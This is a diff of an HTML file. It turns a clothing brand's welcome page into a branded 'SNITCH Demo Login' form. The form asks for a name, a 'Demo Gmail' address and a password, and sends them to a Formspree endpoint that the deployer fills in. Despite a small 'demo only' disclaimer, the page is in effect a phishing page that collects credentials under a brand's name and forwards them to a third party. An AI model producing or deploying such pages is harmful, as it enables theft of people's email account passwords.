@@ -1,9 +1,33 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
 <head>
-    <title>Snitch Clothing</title>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>SNITCH — Demo Login</title>
+  <style>
+    body { font-family: Arial, sans-serif; background:#f4f6fb; display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}
+    .card{background:#fff;padding:26px;border-radius:10px;box-shadow:0 10px 30px rgba(0,0,0,.08);width:360px;text-align:center}
+    img{width:110px;margin-bottom:10px}
+    input{width:100%;padding:10px;margin:8px 0;border-radius:8px;border:1px solid #ddd;box-sizing:border-box}
+    button{width:100%;padding:10px;border:0;background:#111;color:#fff;border-radius:8px;font-weight:600;cursor:pointer}
+    small{color:#666}
+  </style>
 </head>
 <body>
-    <h1>Welcome to Babe Snitch Clothing</h1>
+  <div class="card">
+    <img src="https://your-logo-link-here.png" alt="Snitch Logo">
+    <h2>SNITCH Demo Login</h2>
+    <p><small>Demo only — enter any text. Submissions go to Formspree.</small></p>
+
+    <!-- REPLACE the action URL with your Formspree endpoint -->
+    <form action="https://formspree.io/f/YOUR_FORM_ID" method="POST">
+      <input name="name" type="text" placeholder="Name" required>
+      <input name="email" type="email" placeholder="Demo Gmail (example@domain.com)" required>
+      <input name="password" type="password" placeholder="Demo Password (hidden)" required>
+      <button type="submit">Submit (Demo)</button>
+    </form>
+
+    <p style="margin-top:12px"><small>Works on mobile & desktop. Password input hides text as dots.</small></p>
+  </div>
 </body>
 </html>
